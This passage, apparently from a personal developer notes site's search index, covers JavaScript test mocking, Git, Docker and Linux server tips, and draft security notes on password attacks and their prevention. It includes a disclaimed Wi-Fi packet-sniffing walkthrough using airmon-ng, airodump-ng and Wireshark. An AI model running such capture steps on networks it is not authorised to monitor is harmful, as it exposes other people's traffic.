vi.mock(\u0026#34;./cal1Thing\u0026#34;); describe(\u0026#34;calculateThings\u0026#34;, () =\u0026gt; { const { resetCached } = testingOnly; afterEach(() =\u0026gt; { vi.restoreAllMocks(); }); it(\u0026#34;should work as expected\u0026#34;, () =\u0026gt; { cal1Thing.mockReturnValue(\u0026#34;a string\u0026#34;); const caledThings = calculateThings([1, 2, 3]); expect(caledThings).toEqual([\u0026#34;a string\u0026#34;, \u0026#34;a string\u0026#34;, \u0026#34;a string\u0026#34;]); }); it(\u0026#34;should return empty when empty cached and input is empty array\u0026#34;, () =\u0026gt; { resetCached(); // remember reset cached const caledThings = calculateThings([]); expect(caledThings).toEqual(\u0026#34;\u0026#34;); }); }); Setup code for testing only # This setup will help you export function only when run test, not appear when build Gulp - Rollup # // rollup.bundle.js import stripCode from \u0026#34;rollup-plugin-strip-code\u0026#34;; import {rollup} from rollup; const stripcode = stripCode({ start_comment: \u0026#34;start-test-code\u0026#34;, end_comment: \u0026#34;end-test-code\u0026#34;, }); export default async () =\u0026gt; { const bundle = await rollup({input: \u0026#39;mainFilePath.js\u0026#39;, plugins: [stripcode]}); await bundle.write({ file: \u0026#39;dist/destinationName.js\u0026#39;, format: \u0026#39;iife\u0026#39;, name: \u0026#39;YourObjectName\u0026#39;, sourcemap: false }) } // gulpfile.js import rollupBundle from \u0026#34;./rollup.bundle.js\u0026#34;; const clean = () =\u0026gt; { // remove all previous build files or ST like that }, lint = () =\u0026gt; { // run eslint warning }; export default () =\u0026gt; { series(clean, rollupBundle, lint); }; Vite - Vitest # Mock module # When you mock a module, everything you exported in this module will be mocked and can not act like original (even if you call vi.restoreAllMocks()) Solution:\nIf your module exports alots, and you only want to mock one thing, you should split it into another module\nExample:\n// calculateThings.js import cal1Thing from \u0026#34;./private/cal1Thing.js\u0026#34;; export default (things) =\u0026gt; { let result = []; for (let i = 0; i \u0026lt; things.length; i++) { const calculatedThing = cal1Thing(things[i]); result.push(calculatedThing); } return result; }; // calculateThings.test.js import calculateThings from \u0026#34;./calculateThings\u0026#34;; import cal1Thing from \u0026#34;./cal1Thing\u0026#34;; vi.mock(\u0026#34;./cal1Thing\u0026#34;); describe(\u0026#34;calculateThings\u0026#34;, () =\u0026gt; { afterEach(() =\u0026gt; { vi.restoreAllMocks(); }); it(\u0026#34;should work as expected\u0026#34;, () =\u0026gt; { cal1Thing.mockReturnValue(\u0026#34;a string\u0026#34;); const caledThings = calculateThings([1, 2, 3]); expect(caledThings).toEqual([\u0026#34;a string\u0026#34;, \u0026#34;a string\u0026#34;, \u0026#34;a string\u0026#34;]); }); }); Sinon # Stub a function that is called by another function in the same module # Using this.[func_name] when calling it in your module\nStub an export default function # import * as query from \u0026#34;/database/query\u0026#34;; const makeQueryStub = sandbox.stub(query, \u0026#34;default\u0026#34;).resolves([]); Mocha - Chai - Sinon sample # import sinon from \u0026#34;sinon\u0026#34;; import { function_name, callback_function_name } from \u0026#34;../module_name.js\u0026#34;; const sandbox = sinon.createSandbox(); describe(\u0026#34;module_name\u0026#34;, function () { afterEach(function () { sandbox.restore(); }); describe(\u0026#34;function_name\u0026#34;, function () { it(\u0026#34;Should be a function\u0026#34;, function () { expect(function_name).to.be.a(\u0026#34;function\u0026#34;); }); it(\u0026#34;Should return this value if window.screen is undefined\u0026#34;, function () { sandbox.stub(window, \u0026#34;screen\u0026#34;).value(undefined); expect(function_name()).equal(\u0026#34;expected string\u0026#34;); }); it(\u0026#34;should return expected object when running callback function\u0026#34;, function (done) { callback_function_name(function (returnedData) { expect(returnedData).to.deep.equal({ name: \u0026#34;expected object\u0026#34; }); done(); }); }); }); }); Jest - Sinon sample # import sinon from \u0026#34;sinon\u0026#34;; import { function_name, async_function_name } from \u0026#34;../module_name.js\u0026#34;; const sandbox = sinon.createSandbox(); describe(\u0026#34;module_name\u0026#34;, function () { afterEach(function () { sandbox.restore(); }); describe(\u0026#34;function_name\u0026#34;, function () { it(\u0026#34;Should be a function\u0026#34;, function () { expect(typeof function_name).toEqual(\u0026#34;function\u0026#34;); }); it(\u0026#34;Should return this value if window.screen is undefined\u0026#34;, function () { sandbox.stub(window, \u0026#34;screen\u0026#34;).value(undefined); expect(function_name()).toEqual(\u0026#34;expected string\u0026#34;); }); it(\u0026#34;should return expected object when handling function asynchronously\u0026#34;, async () =\u0026gt; { const returnedData = await async_function_name(); expect(returnedData).toEqual({ name: \u0026#34;expected object\u0026#34; }); }); }); }); "},{"id":18,"href":"/docs/research/security/","title":"Security - Draft","section":"RESEARCH","content":" Security # Brute Force Attack # Every password-based system and encryption key out there can be cracked using a brute force attack. There is only one problem with this attack: the time. Why does the hashing method matter when cracking passwords with a brute force attack? Bcrypt will take longer to crack than MD5 Use case # Cracking passwords (SSH logins) Cracking encryption keys (API keys) How it works # The hacker have to run through every possible combination of characters before achieving their goal These attacks are often carried out by scripts or bots that target specific systems or accounts Prevention # Longer password Delay response: A system that responds immediately is not always good. Adding a delay when checking passwords, even a delay of a few seconds, can greatly weaken the effectiveness of a brute force attack Stronger hashing method Two-factor authentication Rate limit Dictionary attack # Use case # A dictionary attack is a method of breaking into a password-protected computer, network or other IT resource by systematically entering every word in a dictionary, or word list, as a password A dictionary attack can also be used in an attempt to find the key necessary to decrypt an encrypted message or document How it works # If it targets an organization or a particular person, the dictionary can collect all the closely related words around the target they want to hack. It can then combine all of them in all possible ways and try each combination to guess the password or key they want to hack Prevention # Avoid passwords: Passwords can\u0026rsquo;t be hacked if we don\u0026rsquo;t use them for login (I\u0026rsquo;m joking). From a system perspective, we can completely avoid them by using password-free authentication solutions and biometric logins Random passwords: From a user perspective, don\u0026rsquo;t use closely related information (like names, pets, birthdays) or easy-to-predict words (like \u0026ldquo;password,\u0026rdquo; \u0026ldquo;abcd,\u0026rdquo; \u0026ldquo;xyz,\u0026rdquo; \u0026ldquo;123\u0026rdquo;) to create a password. Instead, use random strings. If you find them difficult to remember, you can use a third-party password manager to store them (of course, you need to choose a trustworthy one). Two-factor authentication Limit login attempts Force resets Malicious Network Redirects # Attackers can inject fake DNS responses, redirecting you to malicious versions of websites\nHow it works # Hacker hijacking the unsecured Wi-Fi you access Malware in your computer edit your Host file (the file work like the DNS in your computer) Prevention # Using SSL/TLS for website: Even if SSL helps detect this (you’d see a certificate warning), many users may overlook or click through the warning, which could put them at risk DOS # Prevention # Rate limit DDOS # Backdoor attack # SQL injection # Cross-site scripting (XSS) attack # Cross-site request forgery (CSRF) attack # IDOR attack # Authorize route\nCross-domain access attack # Syn flood attack # Man in the middle attack # Packet Sniffing ARP Spoofing Evil Twin Attack Deauthentication Attack DNS Spoofing TODO: Setup server in front of real server Replay attack # Relay attack # request modify # response modify # References # Cloudflare: What is a brute force attack? Hivesystems: Are Your Passwords in the Green? (2024) Kaspersky: What is a Dictionary Attack? "},{"id":19,"href":"/docs/research/security/xss/","title":"XSS - Draft","section":"Security - Draft","content":" Cross-site scripting attack # "},{"id":20,"href":"/docs/problems/design_hashmap/","title":"Design HashMap - Draft","section":"PROBLEMS","content":" Design HashMap # Overview # Its other names: hash table, map, unordered map, dictionary\nA hash table is a data structure that you can use to store data in key-value format with direct access to its items in constant time\nThe most valuable aspect of a hash table over other abstract data structures is its speed to perform insertion, deletion, and search operations. Hash tables can do them all in constant time\nTime complexity\nOperation Average Worst case Search O(1) O(n) Insert O(1) O(n) Delete O(1) O(n) Space complexity\nSpace O(n) O(n) Design requirement # Let\u0026rsquo;s begin with a hash map for storing phone books\nHash map for storing phone books\nNot using any built-in hash map libraries HashMap() initializes the object with an empty map void put(string key, string value) inserts a (key, value) pair into the HashMap. If the key already exists in the map, update the corresponding value string get(key) returns the value to which the specified key is mapped, or empty string if this map contains no mapping for the key void remove(key) removes the key and its corresponding value if the map contains the mapping for the key Design hashing function # Hash collisions # Problem # Solution # Open addressing Linear probing Plus 3 rehash Quadratic probing (failed attempts) Double hashing Closed addresing Use cases # Sets # A set is like a hash map except it only stores keys, without values\nReference # Leetcode: Design HashMap Interviewcake: Hash Table (2018 Jun 18) Freecodecamp: JavaScript Hash Table – Associative Array Hashing in JS Wikipedia: Hash table Khalilstemmler: Hash Tables | What, Why \u0026amp; How to Use Them (Jan 19th, 2022) Youtube: Hash Tables and Hash Functions (Mar 5th, 2017) "},{"id":21,"href":"/docs/tips/002_git/","title":"Git","section":"TIPS","content":" Git - Github Tips # Terminology # HEAD: your current local working branch origin: the address to your remote git, represent for remote repo Tracked file: the file git already had before, so when you edit it, git knows this file is modified (M files)\nUntracked (new file): the file recently add and git don’t know anything about it (U files)\nRemote-tracking branches: References (in the form of origin/branch-name) that point to the branches in a remote repository Commit # git add . git commit -m \u0026#34;commit message\u0026#34; These 2 commands above can combie into 1:\ngit commit -am \u0026#34;commit message\u0026#34; Note: this only work with tracked files\nChange previous commit message # Commit amend # git commit --amend -m \u0026#34;new message to replace the previous message\u0026#34; Note: this amend can also simplify by amen :))))\nRebase reword # git rebase -i HEAD~1 Vim IDE appear and show a latest commit type i to begin insert mode, ready to modify change pick to r or reword → means you will change this commit message press ESC key to end insert mode type :wq to save new Vim IDE appear to let you change the commit message change and save like the early steps git push -f Opps! Code on wrong branch # Stash # git stash git checkout correct-branch git stash pop Note: git stash will only bring the changes on tracked files to store but don\u0026rsquo;t worry when checkout to other branch, the untracked files will move to there also\nOpps! Commit into local main branch # Reset # Solution 1: Erase the current commit and go back to the earlier commit\ngit reset --hard HEAD~1 Solution 2: Bring the current commit to staged change and go back to the earlier commit\ngit reset --soft HEAD~1 Update the outdated feature branch # Relocate branch: rebase # before rebase\n==\u0026gt; after rebase\ngit checkout master git pull git rebase master topic git push -f Note: topic branch will have code from F and G of main branch, but if it conflicts with topic branch, the solution will be the same here\nPull origin # Collect code from master to feature branch. Feature branch in this example is topic branch\ngit checkout master git pull git checkout topic git pull origin master Note: never ever tried it yet Clean up messy commits # Accumulate commits: rebase fixup # If you have 3 messy commits per 4 commits on your feature branch\ngit rebase -i HEAD~4 Vim IDE appear and show 4 latest commits Type i to change into insert mode Change pick to f or fixup → means you accumulate this 3 commits Out insert mode with ESC key Type :wq to save\ngit push -f before after Note: the present commit will have all changes from 3 previous commits\nDelete all local branches except main branch # git branch | grep -v \u0026#34;main\u0026#34; | xargs git branch -D Explain:\nGet all branches (except for the main) via git branch | grep -v \u0026quot;main\u0026quot; command Select every branch with xargs command Delete branch with git branch -D Clean up outdated references # It only removes remote-tracking branches that no longer exist on the remote All local branches you’ve created yourself won’t be affected git fetch --prune Refresh outdated local branch # If you pull but show some warnings or errors and git show a recommend that is need to type some rebase commands Just checkout to another branch, delete your local conflict branch and then checkout to this branch again to download a latest one in remote repo git checkout dev git branch -D feature-branch git fetch git checkout feature-branch Force pull # git pull -f Note: never ever tried it yet Merge PR but get stuck in conflict # Relocate branch: rebase # git checkout main git pull checkout feature-branch git rebase main feature-branch Conflict appears in IDE\n→ Resolve conflict and save file git add . git rebase --continue Vim IDE appear to make you confirm change\n→ :wq git push -f Remote origin # Check remote origin # git remote -v Change remote origin # git remote set-url origin \u0026lt;url\u0026gt; # E.g git remote set-url origin git://new.url.here Remove remote origin # git remote remove origin Log pretty # git log --graph --decorate --oneline or\ngit log --graph --decorate Config # Show current global credential # git config --global --list Configure local repo’s credential # when you want it’s different with the global one\ngit config user.name DangPham112000 git config user.email dangpham112000@gmail.com Switch git user tool # Git-User-Switch Connecting to GitHub using SSH keys (Ubuntu) # Checking for existing SSH keys # ls -al ~/.ssh Check the existing of these files:\nid_rsa.pub id_ecdsa.pub id_ed25519.pub Generating a new SSH key # ssh-keygen -t ed25519 -C \u0026#34;dangpham112000@gmail.com\u0026#34; You can skip all the prompted by Enter\nAdding your SSH key to the ssh-agent # Start the ssh-agent in the background\n$ eval \u0026#34;$(ssh-agent -s)\u0026#34; \u0026gt; Agent pid 59566 Add your SSH private key to the ssh-agent\nssh-add ~/.ssh/id_ed25519 Adding a new SSH key to account # Copy the SSH public key to your clipboard\ncat ~/.ssh/id_ed25519.pub Then select and copy the contents of the id_ed25519.pub file displayed in the terminal to your clipboard\nIn the upper-right corner of any page on GitHub, click your profile photo, then click Settings\nIn the \u0026ldquo;Access\u0026rdquo; section of the sidebar, click SSH and GPG keys\nClick New SSH key or Add SSH key\nIn the \u0026ldquo;Title\u0026rdquo; field, add a descriptive label for the new key. For example, if you\u0026rsquo;re using a personal laptop, you might call this key \u0026ldquo;Personal laptop\u0026rdquo;\nSelect the type of key, either authentication or signing\nIn the \u0026ldquo;Key\u0026rdquo; field, paste your public key\nClick Add SSH key\nTesting your SSH connection # ssh -T git@github.com You may see a message like this: Hi DangPham112000! You've successfully authenticated, but GitHub does not provide shell access.\n"},{"id":22,"href":"/docs/research/security/csrf/","title":"CSRF - Draft","section":"Security - Draft","content":" Cross-site request forgery attack # "},{"id":23,"href":"/docs/tips/003_docker/","title":"Docker","section":"TIPS","content":" Docker Tips # Terminology # Image: Like the execution file (.exe) and even more. It have all needed setup dependences that stored inside it and ready to run instructions Container: Like the process after you run the image, but this application at this time is considered as the whole virtual machine Create # Create a docker image\nDockerfile # You will write all the instructions here, guild the Docker engine what enviroment you want your app to run inside, what needed dependencies to be installed, copy your source code into and last but not least is the command to run your app:\nSpecify a base image Run some commands to install additional programs Specify a command to run on the container startup # Dockerfile # 1. Use an existing docker image as a base FROM alpine # 2. Download and install a dependency RUN apk add --update redis # 3. Tell the image what to do when it starts as a container CMD [\u0026#34;redis-server\u0026#34;] Build # Build an image\n# syntax docker build -t \u0026lt;docker-id\u0026gt;/\u0026lt;project-name\u0026gt;:\u0026lt;version\u0026gt; . # eg. docker build -t dangpham/redis:v1 . The -t flag tags your image with a name (dangpham/redis:v1 in this case) The . is the build context that lets Docker know where it can find the Dockerfile Build an image with specific docker file name # docker build -f Dockerfile.dev . Build an image from the running container # docker commit -c \u0026lt;instruction\u0026gt; \u0026lt;container-id\u0026gt; \u0026lt;image-name\u0026gt; # eg. docker commit -c \u0026#39;CMD [\u0026#34;redis-server\u0026#34;]\u0026#39; c3f279d17e0a dangpham/redis:v2 How to import your project files into the image # # Specify a base image FROM node:14-alpine WORKDIR /usr/app # Install some dependencies COPY ./ ./ RUN npm install # Default command CMD [\u0026#34;npm\u0026#34;, \u0026#34;start\u0026#34;] WORKDIR /usr/app: change container context into this path. It will create a new folder if it doesn’t exist COPY ./ ./: copy from computer-context to container-context computer context: Path to folder copy from on your machine relative to build context container context: Place to copy stuff inside the container (/usr/app in this case) Run # Run a container from the image\ndocker run \u0026lt;image-name\u0026gt; docker run -it \u0026lt;image-name\u0026gt; sh docker run … = docker create … + docker start -a … -it ... sh: connect your terminal with the container shell Docker Run with port mapping # docker run -p \u0026lt;container-port\u0026gt;:\u0026lt;app-port\u0026gt; \u0026lt;image-name\u0026gt; # eg, docker run -p 7070:8080 dangpham/web-app:v1 container-port: Your computer will open this port for container app-port: Your running application exported port inside the container Detach mode # docker run \u0026lt;image-name\u0026gt; -d The -d flag starts up a container in detached mode Means that output from the container will not be piped to your terminal You can continue to run other commands while the container is still running Attach mode # Attach to the sdtin, stdout, stderr of container\u0026rsquo;s primary process into your terminal docker attach \u0026lt;container-id\u0026gt; Execute # Every process that we create in a Linux environment has three communication channels attached to it, that we refer to as:\nstdin: input to process stdout: output from process stderr: error form process These channels are used to communicate information either into the process or out of the process\nExec command # docker exec -it \u0026lt;container-id\u0026gt; \u0026lt;command\u0026gt; -it: Allow us to provide input to the container The -i flag: we are saying make sure that any stuff that our typed gets directed to stdin of Process. The -t flag: make those stuff we receive prettier Terminal access # Get full terminal access inside the context of the container\ndocker exec -it \u0026lt;container-id\u0026gt; sh sh means a shell or a command processor Allow us to type commands in and have them be executed inside that container Listing # Container # Listing all running containers: docker ps Listing both stopped and runnning containers: docker ps --all Image # docker image ls Caching # Docker has the cache mechanism, that compare each instruction in your Dockerfile with its previous\n# Specify a base image FROM node:14-alpine WORKDIR /usr/app # Install some dependencies COPY ./package.json ./ RUN npm install COPY ./ ./ # Default command CMD [\u0026#34;npm\u0026#34;, \u0026#34;start\u0026#34;] package.json israrely update so copying package.json before copying all other stuff It will help Docker runing npm install with cache and It will not re-install all dependencies just because you edit some html/css/js files Volumes # Change code in local machine and effect the container right away without rebuild # docker run -p 3000:3000 -v /app/node_modules -v $(pwd):/app \u0026lt;image_name\u0026gt; Note: -v /app/node_modules: Put a bookmark on the node_modules folder pwd: Present Working Directory -v $(pwd):/app: Map the pwd into the /app folder Explain: Means reference all files in pwd (except things inside node_modules) with all files in /app So when we change code in pwd, it also references to /app Stop # When you issue docker stop to a container, if the container does not automatically stop in 10 seconds, then Docker is going to automatically fall back to issuing the docker kill command.\nSoft # Send SIGTERM (terminate signal) to the process: give a process inside the container a little bit of time to do ST (like backup, etc…)\ndocker stop \u0026lt;container-id\u0026gt; Hard # Send SIGKILL (kills signal): shut down right now\ndocker kill \u0026lt;container-id\u0026gt; Remove # Remove all stopped containers in your machine and also clear your docker cache. It means you must re-download it from docker-hub in the next run\ndocker system prune Log # Retrieve all information that has been emitted from the docker\ndocker logs \u0026lt;container-id\u0026gt; "},{"id":24,"href":"/docs/research/security/packet_sniffing/","title":"Packet Sniffing - Draft","section":"Security - Draft","content":" Packet Sniffing # A type of MitM attack Description: The attacker uses tools like Wireshark, tcpdump, or Kismet to capture packets traveling through the Wi-Fi network Key Characteristics: Often passive (doesn’t modify the traffic, just listens) Works well on unencrypted networks or with weak encryption like WEP Prevention: Use strong encryption (WPA3 is ideal, WPA2 is acceptable) Avoid unencrypted public Wi-Fi Demo # DISCLAIMER: This demo is for educational purposes only. The techniques should only be tested on systems you own or have explicit permission to analyze. Misuse of this information is unethical, may violate the law, and could lead to serious consequences. The author takes no responsibility for any damages or misuse arising from this content Install necessary packages # sudo apt update Aircrack-ng: Airmon-ng is a utility in the Aircrack-ng suite that helps set up a wireless network card into monitor mode Airodump-ng: Captures data packets from nearby wireless networks sudo apt install aircrack-ng Wireshark is a network packet analyzer sudo apt install wireshark Let\u0026rsquo;s go # # Check wireless interface iwconfig # -\u0026gt; E.g output lo no wireless extensions. enp4s0 no wireless extensions. wlo1 IEEE 802.11 ESSID:\u0026#34;A14-01\u0026#34; Mode:Managed Frequency:2.417 GHz Access Point: CC:71:90:62:9E:98 Bit Rate=130 Mb/s Tx-Power=22 dBm Retry short limit:7 RTS thr:off Fragment thr:off Power Management:on Link Quality=62/70 Signal level=-48 dBm Rx invalid nwid:0 Rx invalid crypt:0 Rx invalid frag:0 Tx excessive retries:0 Invalid misc:203 Missed beacon:0 docker0 no wireless extensions. # -\u0026gt; Your wireless interface is wlo1 # Disconnect the wireless adapter from managing a network sudo airmon-ng check kill # Enable monitor mode on your wireless adapter sudo airmon-ng start wlo1 # Verify iwconfig # -\u0026gt; E.g output lo no wireless extensions. enp4s0 no wireless extensions. docker0 no wireless extensions. wlo1mon IEEE 802.11 Mode:Monitor Frequency:2.457 GHz Retry short limit:7 RTS thr:off Fragment thr:off Power Management:on # -\u0026gt; Your wireless adapter with monitor mode is now wlo1mon # Capture packets sudo airodump-ng wlo1mon sudo wireshark # -\u0026gt; Use Wireshark to capture packets on the wlo1mon interface Stop capturing packets (exit monitor mode) sudo airmon-ng stop wlo1mon sudo systemctl restart NetworkManager References # Wireshark: Turning on monitor mode (Aug 11th, 2020) Linuxhint: How to Install and Use Wireshark on Ubuntu (2018) "},{"id":25,"href":"/docs/tips/004_ops/","title":"Ops","section":"TIPS","content":" Operation Tips # Common Commands # IP address # # Public curl ipinfo.io/ip # Local ip address show Show detail a command # man \u0026lt;command\u0026gt; # E.g man vim # Then press q to quit Best practice before install anything # sudo apt update sudo apt upgrade Show package detail # apt show \u0026lt;package-name\u0026gt; # E.g apt show ssh E.g output Package: ssh Version: 1:9.6p1-3ubuntu13.5 Priority: optional Section: net Source: openssh Origin: Ubuntu Maintainer: Ubuntu Developers \u0026lt;ubuntu-devel-discuss@lists.ubuntu.com\u0026gt; Original-Maintainer: Debian OpenSSH Maintainers \u0026lt;debian-ssh@lists.debian.org\u0026gt; Bugs: https://bugs.launchpad.net/ubuntu/+filebug Installed-Size: 57.3 kB Depends: openssh-client (\u0026gt;= 1:9.6p1-3ubuntu13.5), openssh-server (\u0026gt;= 1:9.6p1-3ubuntu13.5) Homepage: https://www.openssh.com/ Download-Size: 4,658 B APT-Sources: http://vn.archive.ubuntu.com/ubuntu noble-updates/main amd64 Packages Description: secure shell client and server (metapackage) This metapackage is a convenient way to install both the OpenSSH client and the OpenSSH server. It provides nothing in and of itself, so you may remove it if nothing depends on it. Print working directory # pwd Copy # cp \u0026lt;source\u0026gt; \u0026lt;destination\u0026gt; # E.g cp readme.md readyou.md # create a copy named readyou with the same content as readme Clear directory # rm -rf \u0026lt;directory-name\u0026gt; Move # mv \u0026lt;source\u0026gt; \u0026lt;destination\u0026gt; # E.g mv readme.md .. # Move readme file to parent dir mv ../readme.md . # Move readme from parent dir to current dir Rename # If you move a file within the current directory, that means you are renaming it mv \u0026lt;old-name\u0026gt; \u0026lt;new-name\u0026gt; # E.g mv readme.md readyou.md Create # # Directory: mkdir \u0026lt;dir-name\u0026gt; # File: touch \u0026lt;file-name\u0026gt; Print file content # cat \u0026lt;file-name\u0026gt; Echo # Print env variable # echo $USER # E.g result: # \u0026gt;\u0026gt; dangpham112 Add content to file # echo Hello $USER \u0026gt; readme.md # readme file now have a content: Hello dangpham112 Systemctl # Restart # systemctl restart \u0026lt;service-name\u0026gt; # E.g systemctl restart ssh Check status # systemctl status \u0026lt;service-name\u0026gt; # E.g systemctl status ssh SSH # Stand for Secure Shell Check SSH score SSH Hardening Guides Connect # # Access SSH server ssh \u0026lt;username\u0026gt;@\u0026lt;ip-address || domain-name\u0026gt; # Then typing password and press enter Login with username and password # ssh \u0026lt;host-username\u0026gt;@\u0026lt;host-ip || host-domain\u0026gt; # -\u0026gt; SSH will promt you to enter the password Login via private-key file # # Change permissions to read-only for the private key file chmod 400 \u0026lt;private-key\u0026gt; # E.g chmod 400 MyServer # Log in via SSH (notice host-username) ssh -i \u0026lt;private-key\u0026gt; \u0026lt;host-username\u0026gt;@\u0026lt;host-ip || host-domain\u0026gt; # E.g 1: If you use EC2 Ubuntu, the host-username maybe ubuntu ssh -i MyServer.pem ubuntu@54.251.177.159 # E.g 2: If you use EC2 Amazon Linux, the host-username maybe ec2-user ssh -i MyServer.pem ec2-user@18.141.175.126 # E.g 3: If you use GCP, the host-username is your account username ssh -i gcp-key dangpham112000@34.55.160.169 Where is private-key file? E.g 1: While you create EC2 instance, you can create key-pair for login in aws console, then they will give you private-key to store on your SSH-client E.g 2: With GCP VM instance, you need to create your own key-pair and upload the public-key\u0026rsquo;s content to SSH-KEYS (Compute Engine \u0026gt; Settings \u0026gt; Metadata \u0026gt; SSH-KEYS) # Create key-pair on SSH-Client with username is your account username ssh-keygen -t rsa -f \u0026lt;keypair-name\u0026gt; -C \u0026lt;username\u0026gt; # E.g ssh-keygen -t rsa -f gcp-key -C dangpham112000 Setup passwordless authentication # # On SSH client # Generate a new SSH key pair using the Ed25519 algorithm ssh-keygen -t ed25519 # -\u0026gt; You can leave all the command prompts empty, just press enter # -\u0026gt; You should notice the location of file *.pub for further actions # Copy the public SSH key to the SSH server ssh-copy-id -i \u0026lt;public-key-file-location\u0026gt; \u0026lt;host-username\u0026gt;@\u0026lt;host-ip || host-domain\u0026gt; # E.g ssh-copy-id -i /root/.ssh/id_ed25519.pub ubuntu@123.213.32.1 # Test the connection ssh \u0026lt;host-username\u0026gt;@\u0026lt;host-ip || host-domain\u0026gt; # -\u0026gt; SSH server will no longer ask you a password Disable root login # # Open the SSH daemon configuration file vim /etc/ssh/sshd_config # in [sshd_config] -\u0026gt; Find PermitRootLogin and set it to no PermitRootLogin no # in [sshd_config] -\u0026gt; Find PasswordAuthentication and set it to no PasswordAuthentication no # Restart the SSH Service systemctl restart ssh Secure copy # From SSH-client to SSH-server # # On SSH-client # From SSH-Client to SSH-Server scp \u0026lt;path-to-file\u0026gt; \u0026lt;host-username\u0026gt;@\u0026lt;host-ip\u0026gt;:\u0026lt;destination\u0026gt; # E.g scp ~/Documents/readme.md ubuntu@18.141.184.34:~/Document/ # Or scp -i \u0026lt;private-key\u0026gt;.pem \u0026lt;path-to-file\u0026gt; \u0026lt;host-username\u0026gt;@\u0026lt;host-ip\u0026gt;:\u0026lt;destination\u0026gt; # E.g scp -i ~/Auth/MyServer.pem ~/Documents/readme.md ubuntu@18.141.184.34:~/Document/ # From SSH-Server to SSH-Client scp \u0026lt;host-username\u0026gt;@\u0026lt;host-ip\u0026gt;:\u0026lt;path-to-file\u0026gt; \u0026lt;destination-on-client\u0026gt; # E.g scp ubuntu@18.141.184.34:~/Document/readyou.md ~/Documents # Or scp -i \u0026lt;private-key\u0026gt;.pem \u0026lt;host-username\u0026gt;@\u0026lt;host-ip\u0026gt;:\u0026lt;path-to-file\u0026gt; \u0026lt;destination-on-client\u0026gt; # E.g scp -i ~/Auth/MyServer.pem ubuntu@18.141.184.34:~/Document/readyou.md ~/Documents Nano # A default text editor of some OS Open file # nano \u0026lt;file-name\u0026gt; # E.g nano index.html Save # Press Ctrl + x Press y Press enter Setup root password # If your root user does not yet have a password # Gain root privileges sudo su # Set a Password passwd root # -\u0026gt; Enter and confirm the password Nginx # Capacity: 2MB Install # sudo apt install nginx ==\u0026gt; Press Tab -\u0026raquo; Choose OK and then press enter\nOpen ports # After installing Nginx, we may not be able to access our website because the firewall is enabled by default If you use EC2, the firewall is disabled by default, but your EC2 Security Group will block access to your website You must edit the inbound rules to allow traffic on HTTP (port 80) and HTTPS (port 443) Check firewall status # sudo ufw status ufw: ubuntu firewall Let\u0026rsquo;s firewall allow nginx # sudo ufw allow \u0026#34;Nginx Full\u0026#34; Locate the index file # /var/www/html/ Locate configuration file # /etc/nginx/sites-available/ # Activate the configuration for Nginx sudo ln -s /etc/nginx/sites-available/\u0026lt;my-config\u0026gt;.conf /etc/nginx/sites-enabled/ # Test config syntax sudo nginx -t # Restart nginx sudo systemctl restart nginx Well-known ports (Link) # SSL Certificate # Let\u0026rsquo;s Encrypt SSL/TLS certificate # Issued at no cost by the Let\u0026rsquo;s Encrypt Certificate Authority Provides Domain Validation (DV) certificates Certificates are valid for 90 days, but they can be renewed automatically with Certbot # Install Snap sudo apt install snapd # Ensure stability and compatibility for all snap packages sudo snap install core; sudo snap refresh core # Install Certbot sudo snap install --classic certbot # Ensures that Certbot is accessible system-wide sudo ln -s /snap/bin/certbot /usr/bin/certbot # Obtain and install a certificate for a website running on Nginx # Automatically configuring Nginx to use HTTPS sudo certbot --nginx # -\u0026gt; Certbot will prompt you to provide some information # Test automatic renewal sudo certbot renew --dry-run # -\u0026gt; If the dry run is successful, you\u0026#39;ll see output similar to: # Congratulations, all renewals succeeded Certbot: A popular tool for obtaining and managing SSL/TLS certificates from the Let\u0026rsquo;s Encrypt Certificate Authority Certificates for localhost # Create CA certificate # Generate RootCA.pem, RootCA.key, and RootCA.crt: # Generate a Root CA Certificate openssl req -x509 -nodes -new -sha256 -days 1024 -newkey rsa:2048 -keyout RootCA.key -out RootCA.pem -subj \u0026#34;/C=US/CN=Example-Root-CA\u0026#34; # -\u0026gt; RootCA.key \u0026amp; RootCA.pem # Convert the Certificate to .crt Format openssl x509 -outform pem -in RootCA.pem -out RootCA.crt # -\u0026gt; RootCA.crt RootCA.key: Private key for the Root CA RootCA.pem: Self-signed certificate for the Root CA in PEM format RootCA.crt: Contains the same information as RootCA.pem, but they are often distinguished by convention Create a configuration snippet # Create a file domains.ext # domains.ext authorityKeyIdentifier=keyid,issuer basicConstraints=CA:FALSE keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment subjectAltName = @alt_names [alt_names] DNS.1 = localhost Generating a signed certificate for localhost # Generate localhost.key, localhost.csr, and localhost.crt # Generate a CSR (Certificate Signing Request) for localhost openssl req -new -nodes -newkey rsa:2048 -keyout localhost.key -out localhost.csr -subj \u0026#34;/C=US/ST=YourState/L=YourCity/O=Example-Certificates/CN=localhost\u0026#34; # -\u0026gt; localhost.key \u0026amp; localhost.csr # Sign the CSR with a Root CA to generate the signed certificate openssl x509 -req -sha256 -days 1024 -in localhost.csr -CA RootCA.pem -CAkey RootCA.key -CAcreateserial -extfile domains.ext -out localhost.crt # -\u0026gt; localhost.crt localhost.key: Private key for the certificate localhost.csr: Certificate Signing Request (CSR) that can be sent to a Certificate Authority (CA) for signing localhost.crt: The final signed certificate for localhost generated by your Root CA Configure your webserver # Nginx server { listen 443 ssl default_server; listen [::]:443 ssl default_server; ssl_certificate /home/dangpham/Auth/ssl_cert/localhost.crt; ssl_certificate_key /home/dangpham/Auth/ssl_cert/localhost.key; root /var/www/html; index index.html index.htm index.nginx-debian.html; server_name localhost; location / { try_files $uri $uri/ =404; } } Nodejs const https = require(\u0026#39;https\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); const path = require(\u0026#39;path\u0026#39;); const certLocation = \u0026#39;/home/dangpham/Auth/ssl_cert\u0026#39;; const options = { key: fs.readFileSync(path.resolve(certLocation, \u0026#39;localhost.key\u0026#39;)), cert: fs.readFileSync(path.resolve(certLocation, \u0026#39;localhost.crt\u0026#39;)), }; const server = https.createServer(options,(req, res) =\u0026gt; { if (req.url === \u0026#39;/hello\u0026#39; \u0026amp;\u0026amp; req.method === \u0026#39;GET\u0026#39;) { res.writeHead(200, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain\u0026#39; }); res.end(\u0026#39;world\u0026#39;); } else { res.writeHead(404, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain\u0026#39; }); res.end(\u0026#39;Not Found\u0026#39;); } }); server.listen(443, () =\u0026gt; { console.log(\u0026#39;Server is listening on port 443\u0026#39;); 